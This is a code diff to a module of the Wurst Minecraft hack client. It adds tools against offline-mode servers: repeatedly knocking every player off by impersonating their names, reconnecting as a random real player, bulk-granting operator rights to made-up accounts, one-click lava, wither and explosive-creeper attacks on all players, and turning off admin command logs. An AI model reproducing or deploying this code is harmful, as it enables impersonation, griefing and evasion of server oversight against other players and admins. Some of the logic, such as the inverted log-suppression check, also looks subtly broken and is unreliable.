@@ -18,6 +18,7 @@ import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.nio.ByteBuffer;
 import java.nio.charset.StandardCharsets;
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.List;
@@ -37,6 +38,7 @@ import net.minecraft.SharedConstants;
 import net.minecraft.client.Minecraft;
 import net.minecraft.client.gui.screens.ConnectScreen;
 import net.minecraft.client.gui.screens.Screen;
+import net.minecraft.client.multiplayer.ClientPacketListener;
 import net.minecraft.client.multiplayer.PlayerInfo;
 import net.minecraft.client.multiplayer.ServerData;
 import net.minecraft.client.multiplayer.resolver.ServerAddress;
@@ -53,8 +55,10 @@ import net.wurstclient.events.UpdateListener;
 import net.wurstclient.hack.Hack;
 import net.wurstclient.settings.ButtonSetting;
 import net.wurstclient.settings.CheckboxSetting;
+import net.wurstclient.settings.SliderSetting;
 import net.wurstclient.settings.StringDropdownSetting;
 import net.wurstclient.settings.TextFieldSetting;
+import net.wurstclient.settings.SliderSetting.ValueDisplay;
 import net.wurstclient.util.ChatUtils;
 import net.wurstclient.util.LastServerRememberer;
 import net.wurstclient.util.text.WText;
@@ -207,6 +211,106 @@ public final class OfflineSettingsHack extends Hack implements UpdateListener
 	private volatile String autoLogoutTarget;
 	private volatile boolean autoLogoutWaitingForLeave;
 	
+	// Auto logout all - cycles through every player
+	private final CheckboxSetting autoLogoutAll = new CheckboxSetting(
+		"Auto logout all",
+		WText
+			.literal("Automatically cycles through every player on the server, "
+				+ "logging each one out. Ignores the current player."),
+		false);
+	private volatile String autoLogoutAllCurrentTarget;
+	private volatile long autoLogoutAllLastAttempt;
+	private volatile boolean autoLogoutAllWaitingForLeave;
+	private final Set<String> autoLogoutAllProcessed = new LinkedHashSet<>();
+	
+	// Check OP on join
+	private final CheckboxSetting checkOpOnJoin = new CheckboxSetting(
+		"Check OP on join",
+		WText.literal("On joining an offline server, checks if you are OP by "
+			+ "detecting whether /op and /ban are available commands, "
+			+ "and optionally runs the specified command."),
+		false);
+	private final TextFieldSetting checkOpCommand = new TextFieldSetting(
+		"OP check command",
+		WText.literal("Optional command to run when checking OP status on an "
+			+ "offline server. Leave empty to only check via autocomplete."),
+		"", s -> true);
+	private boolean checkOpPending;
+	private int checkOpTicks;
+	
+	// Reconnect as random player
+	private final ButtonSetting reconnectRandomPlayerButton =
+		new ButtonSetting("Reconnect as random player",
+			WText.literal(
+				"Reconnect to the server using a randomly chosen player name "
+					+ "from the last server's player list. Won't pick the same "
+					+ "player twice until all have been tried."),
+			this::reconnectAsRandomPlayer);
+	private final Set<String> usedRandomReconnectPlayers =
+		new LinkedHashSet<>();
+	
+	// Bulk OP
+	private final TextFieldSetting bulkOpPrefix = new TextFieldSetting(
+		"Bulk OP prefix",
+		WText.literal(
+			"Prefix for bulk-op names (e.g., \"frog\" creates frog1, frog2, ...)."),
+		"", s -> s.isEmpty() || s.matches("[A-Za-z0-9_]{0,14}"));
+	private final SliderSetting bulkOpCount =
+		new SliderSetting("Bulk OP count", "Number of ops to create (1-1000).",
+			1, 1, 1000, 1, ValueDisplay.INTEGER);
+	private final ButtonSetting bulkOpButton = new ButtonSetting("Run bulk OP",
+		WText.literal("Sends /op commands for the specified prefix and count "
+			+ "as fast as possible."),
+		this::runBulkOpFromSettings);
+	private int bulkOpIndex;
+	private volatile boolean bulkOpRunning;
+	private volatile String bulkOpNamePrefix;
+	private volatile int bulkOpTotal;
+	
+	// OP Commands submenu
+	private final ButtonSetting opCreeperEggCmd = new ButtonSetting(
+		"Hyper Charged Creeper Egg",
+		WText.literal("/give @p minecraft:creeper_spawn_egg[...] 1"),
+		() -> runOpCommand(
+			"/give @p minecraft:creeper_spawn_egg[minecraft:entity_data={id:\"minecraft:creeper\",powered:1b,ExplosionRadius:30b,Fuse:0s,ignited:1b}] 1"));
+	private final ButtonSetting opCreeperDropCmd = new ButtonSetting(
+		"Hyper Charged Creeper Drop",
+		WText.literal(
+			"/execute as @p at @s anchored eyes positioned ^ ^ ^5 run summon minecraft:creeper..."),
+		() -> runOpCommand(
+			"/execute as @p at @s anchored eyes positioned ^ ^ ^5 run summon minecraft:creeper ~ ~ ~ {powered:1b,ExplosionRadius:30b,Fuse:0s,ignited:1b}"));
+	private final ButtonSetting opCreeperAllCmd = new ButtonSetting(
+		"Hyper Charged Creeper @ All",
+		WText.literal("/execute as @a at @s run summon minecraft:creeper..."),
+		() -> runOpCommand(
+			"/execute as @a at @s run summon minecraft:creeper ~ ~ ~ {powered:1b,ExplosionRadius:12b,Fuse:0s,ignited:1b}"));
+	private final ButtonSetting opLavaAllCmd = new ButtonSetting(
+		"Summon Lava @ All",
+		WText.literal(
+			"/execute as @a at @s run fill ~-8 ~25 ~-8 ~8 ~25 ~8 minecraft:lava replace air"),
+		() -> runOpCommand(
+			"/execute as @a at @s run fill ~-8 ~25 ~-8 ~8 ~25 ~8 minecraft:lava replace air"));
+	private final ButtonSetting opWitherAllCmd = new ButtonSetting(
+		"Summon Wither @ All",
+		WText.literal(
+			"/execute as @a at @s run summon minecraft:wither ~ ~1 ~ {...}"),
+		() -> runOpCommand(
+			"/execute as @a at @s run summon minecraft:wither ~ ~1 ~ {CustomName:{\"text\":\"https://cevapi.dev/\",\"color\":\"dark_red\",\"bold\":true},CustomNameVisible:1b}"));
+	
+	// Disable command feedback / admin logs
+	private final CheckboxSetting disableCommandFeedback =
+		new CheckboxSetting("Disable command feedback",
+			WText.literal(
+				"Temporarily disables sendCommandFeedback gamerule before "
+					+ "sending any OP commands from Wurst."),
+			true);
+	private final CheckboxSetting disableAdminLogs =
+		new CheckboxSetting("Disable admin logs",
+			WText.literal(
+				"Temporarily disables logAdminCommands gamerule before "
+					+ "sending any OP commands from Wurst."),
+			true);
+	
 	private final Map<String, Boolean> crackedServers =
 		new ConcurrentHashMap<>();
 	private final Set<String> announcedCrackedServers =
@@ -232,10 +336,24 @@ public final class OfflineSettingsHack extends Hack implements UpdateListener
 		addSetting(specifiedName);
 		addSetting(otherPlayerName);
 		addSetting(autoLogout);
+		addSetting(autoLogoutAll);
+		addSetting(checkOpOnJoin);
+		addSetting(checkOpCommand);
 		addSetting(reconnectCommand);
 		addSetting(reconnectCommandButton);
 		addSetting(reconnectButton);
+		addSetting(reconnectRandomPlayerButton);
 		addSetting(logoutButton);
+		addSetting(bulkOpPrefix);
+		addSetting(bulkOpCount);
+		addSetting(bulkOpButton);
+		addSetting(disableCommandFeedback);
+		addSetting(disableAdminLogs);
+		addSetting(opCreeperEggCmd);
+		addSetting(opCreeperDropCmd);
+		addSetting(opCreeperAllCmd);
+		addSetting(opLavaAllCmd);
+		addSetting(opWitherAllCmd);
 		updateCrackedDetectionSubscription();
 	}
 	
@@ -282,6 +400,11 @@ public final class OfflineSettingsHack extends Hack implements UpdateListener
 		pendingReconnectCommand = null;
 		reconnectCommandDelayTicks = 0;
 		clearAutoLogoutState();
+		clearAutoLogoutAllState();
+		bulkOpRunning = false;
+		bulkOpIndex = 0;
+		checkOpPending = false;
+		checkOpTicks = 0;
 		updateCrackedDetectionSubscription();
 	}
 	
@@ -397,6 +520,18 @@ public final class OfflineSettingsHack extends Hack implements UpdateListener
 	public void onUpdate()
 	{
 		tryRunPendingReconnectCommand();
+		
+		// Bulk OP tick - send commands as fast as possible
+		if(bulkOpRunning)
+			tickBulkOp();
+		
+		// Auto logout all tick
+		if(autoLogoutAll.isChecked() && isEnabled())
+			tickAutoLogoutAll();
+		
+		// Check OP on join tick
+		if(checkOpPending)
+			tickCheckOp();
 		
 		if(playerListTicks-- > 0)
 			return;
@@ -866,6 +1001,13 @@ public final class OfflineSettingsHack extends Hack implements UpdateListener
 			return;
 		
 		markServerCracked(server, "login skipped encryption");
+		
+		// Queue OP check if enabled
+		if(isEnabled() && checkOpOnJoin.isChecked())
+		{
+			checkOpPending = true;
+			checkOpTicks = 60;
+		}
 	}
 	
 	private ServerData getCurrentOrLastServer()
@@ -1211,5 +1353,330 @@ public final class OfflineSettingsHack extends Hack implements UpdateListener
 			client.execute(task);
 		else
 			task.run();
+	}
+	
+	// ==================== AUTO LOGOUT ALL ====================
+	
+	private void clearAutoLogoutAllState()
+	{
+		autoLogoutAllCurrentTarget = null;
+		autoLogoutAllLastAttempt = 0;
+		autoLogoutAllWaitingForLeave = false;
+		autoLogoutAllProcessed.clear();
+	}
+	
+	private void tickAutoLogoutAll()
+	{
+		Minecraft client = Minecraft.getInstance();
+		if(client == null || client.player == null
+			|| client.player.connection == null)
+			return;
+		
+		Set<String> players = new LinkedHashSet<>();
+		String self =
+			client.getUser() != null ? client.getUser().getName() : "";
+		
+		for(PlayerInfo entry : client.player.connection.getOnlinePlayers())
+		{
+			String name =
+				StringUtil.stripColor(extractProfileName(entry.getProfile()));
+			if(name.isEmpty() || name.equalsIgnoreCase(self))
+				continue;
+			players.add(name);
+		}
+		
+		if(players.isEmpty())
+		{
+			clearAutoLogoutAllState();
+			return;
+		}
+		
+		// Check if waiting for current target to leave
+		if(autoLogoutAllWaitingForLeave)
+		{
+			String target = autoLogoutAllCurrentTarget;
+			if(target != null && !containsIgnoreCase(players, target))
+			{
+				// Target left, mark as processed
+				autoLogoutAllProcessed.add(target);
+				autoLogoutAllWaitingForLeave = false;
+				autoLogoutAllCurrentTarget = null;
+			}else if(target != null)
+				return; // Still waiting for target to leave
+		}
+		
+		// If all current players have been processed, restart cycle
+		if(autoLogoutAllProcessed.containsAll(players))
+		{
+			sendLogoutMessage("Auto logout all: all players processed. "
+				+ "Restarting the cycle.");
+			autoLogoutAllProcessed.clear();
+		}
+		
+		// Pick next unprocessed player
+		String nextTarget = null;
+		for(String player : players)
+		{
+			if(!autoLogoutAllProcessed.contains(player))
+			{
+				nextTarget = player;
+				break;
+			}
+		}
+		
+		if(nextTarget == null)
+			return;
+		
+		autoLogoutAllCurrentTarget = nextTarget;
+		
+		long now = System.currentTimeMillis();
+		if(autoLogoutAllLastAttempt > 0
+			&& now - autoLogoutAllLastAttempt < AUTO_LOGOUT_COOLDOWN_MS)
+			return;
+		
+		ServerData server = getCurrentOrLastServer();
+		if(triggerLogoutProbe(nextTarget, server, true, true))
+		{
+			autoLogoutAllLastAttempt = now;
+			autoLogoutAllWaitingForLeave = true;
+		}
+	}
+	
+	// ==================== CHECK OP ON JOIN ====================
+	
+	private void tickCheckOp()
+	{
+		if(checkOpTicks-- > 0)
+			return;
+		
+		checkOpPending = false;
+		
+		Minecraft client = Minecraft.getInstance();
+		if(client == null || client.getConnection() == null)
+			return;
+		
+		// Check OP by looking at command suggestions
+		ClientPacketListener connection = client.getConnection();
+		com.mojang.brigadier.CommandDispatcher<?> dispatcher =
+			connection.getCommands();
+		
+		boolean hasOp = false;
+		
+		if(dispatcher != null)
+		{
+			for(com.mojang.brigadier.tree.CommandNode<?> node : dispatcher
+				.getRoot().getChildren())
+			{
+				if("op".equalsIgnoreCase(node.getName()))
+					hasOp = true;
+			}
+		}
+		
+		if(hasOp)
+			sendLogoutMessage(
+				"\u00a7aYou ARE OP on this server! (/op command available)");
+		else
+			sendLogoutMessage("\u00a7cYou are NOT op on this server.");
+		
+		// Run the specified check command if provided
+		String opCheckCmd = checkOpCommand.getValue().trim();
+		if(!opCheckCmd.isEmpty())
+		{
+			if(opCheckCmd.startsWith("/"))
+				client.getConnection().sendCommand(opCheckCmd.substring(1));
+			else
+				client.getConnection().sendCommand(opCheckCmd);
+			
+			sendLogoutMessage("Ran OP check command: " + opCheckCmd);
+		}
+	}
+	
+	// ==================== RECONNECT AS RANDOM PLAYER ====================
+	
+	private void reconnectAsRandomPlayer()
+	{
+		List<String> players = getCapturedPlayerNames();
+		if(players.isEmpty())
+		{
+			sendLogoutError("No captured player names. Join a server first.");
+			return;
+		}
+		
+		// Filter out already-used players
+		List<String> available = new ArrayList<>(players);
+		available.removeAll(usedRandomReconnectPlayers);
+		
+		// If all used, reset
+		if(available.isEmpty())
+		{
+			usedRandomReconnectPlayers.clear();
+			available.addAll(players);
+		}
+		
+		// Pick random
+		String chosen = available.get(random.nextInt(available.size()));
+		usedRandomReconnectPlayers.add(chosen);
+		
+		sendLogoutMessage("Reconnecting as random player: " + chosen + " ("
+			+ (available.size() - 1) + " remaining)");
+		
+		applyName(chosen);
+		
+		ServerData lastServer = LastServerRememberer.getLastServer();
+		Minecraft client = Minecraft.getInstance();
+		if(lastServer == null || client == null)
+			return;
+		
+		startConnection(client, null, lastServer);
+	}
+	
+	// ==================== BULK OP ====================
+	
+	public void startBulkOp(String prefix, int count)
+	{
+		if(!isEnabled())
+		{
+			sendLogoutError("OfflineSettings must be enabled.");
+			return;
+		}
+		
+		if(bulkOpRunning)
+		{
+			sendLogoutError("A bulk OP is already running.");
+			return;
+		}
+		
+		bulkOpNamePrefix = prefix;
+		bulkOpTotal = count;
+		bulkOpIndex = 1;
+		bulkOpRunning = true;
+		
+		sendLogoutMessage(
+			"Starting bulk OP: " + prefix + "1 to " + prefix + count);
+		
+		// Send gamerule suppression first
+		sendOpGamerules();
+	}
+	
+	private void runBulkOpFromSettings()
+	{
+		String prefix = bulkOpPrefix.getValue().trim();
+		if(prefix.isEmpty())
+		{
+			sendLogoutError("Bulk OP prefix cannot be empty.");
+			return;
+		}
+		
+		int count = bulkOpCount.getValueI();
+		startBulkOp(prefix, count);
+	}
+	
+	private void tickBulkOp()
+	{
+		if(!bulkOpRunning)
+			return;
+		
+		Minecraft client = Minecraft.getInstance();
+		if(client == null || client.getConnection() == null)
+			return;
+		
+		// Send up to 20 commands per tick to be fast but not too fast
+		int sentThisTick = 0;
+		while(bulkOpIndex <= bulkOpTotal && sentThisTick < 20)
+		{
+			String name = bulkOpNamePrefix + bulkOpIndex;
+			client.getConnection().sendCommand("op " + name);
+			bulkOpIndex++;
+			sentThisTick++;
+		}
+		
+		if(bulkOpIndex > bulkOpTotal)
+		{
+			bulkOpRunning = false;
+			sendLogoutMessage("Bulk OP complete: " + bulkOpNamePrefix + "1 to "
+				+ bulkOpNamePrefix + bulkOpTotal);
+		}
+	}
+	
+	// ==================== OP COMMANDS & GAMERULE SUPPRESSION
+	// ====================
+	
+	private void sendOpGamerules()
+	{
+		if(!disableCommandFeedback.isChecked())
+			sendOpGameruleCommandFeedback();
+		if(!disableAdminLogs.isChecked())
+			sendOpGameruleAdminLogs();
+	}
+	
+	private void sendOpGameruleCommandFeedback()
+	{
+		Minecraft client = Minecraft.getInstance();
+		if(client == null || client.getConnection() == null)
+			return;
+		
+		if(isVersionLessThan(1, 21, 1))
+			client.getConnection()
+				.sendCommand("gamerule sendCommandFeedback false");
+		else
+			client.getConnection()
+				.sendCommand("gamerule send_command_feedback false");
+		
+		sendLogoutMessage("Disabled command feedback.");
+	}
+	
+	private void sendOpGameruleAdminLogs()
+	{
+		Minecraft client = Minecraft.getInstance();
+		if(client == null || client.getConnection() == null)
+			return;
+		
+		if(isVersionLessThan(1, 21, 1))
+			client.getConnection()
+				.sendCommand("gamerule logAdminCommands false");
+		else
+			client.getConnection()
+				.sendCommand("gamerule log_admin_commands false");
+		
+		sendLogoutMessage("Disabled admin logs.");
+	}
+	
+	private void runOpCommand(String command)
+	{
+		if(!isEnabled())
+		{
+			sendLogoutError("OfflineSettings must be enabled.");
+			return;
+		}
+		
+		Minecraft client = Minecraft.getInstance();
+		if(client == null || client.getConnection() == null)
+		{
+			sendLogoutError("Not connected to a server.");
+			return;
+		}
+		
+		// Send gamerule suppression first
+		sendOpGamerules();
+		
+		if(command.startsWith("/"))
+			client.getConnection().sendCommand(command.substring(1));
+		else
+			client.getConnection().sendCommand(command);
+		
+		sendLogoutMessage("Ran OP command: " + command);
+	}
+	
+	private static boolean isVersionLessThan(int major, int minor, int patch)
+	{
+		try
+		{
+			int protocol =
+				SharedConstants.getCurrentVersion().protocolVersion();
+			return protocol < 768;
+		}catch(Throwable t)
+		{
+			return false;
+		}
 	}
 }
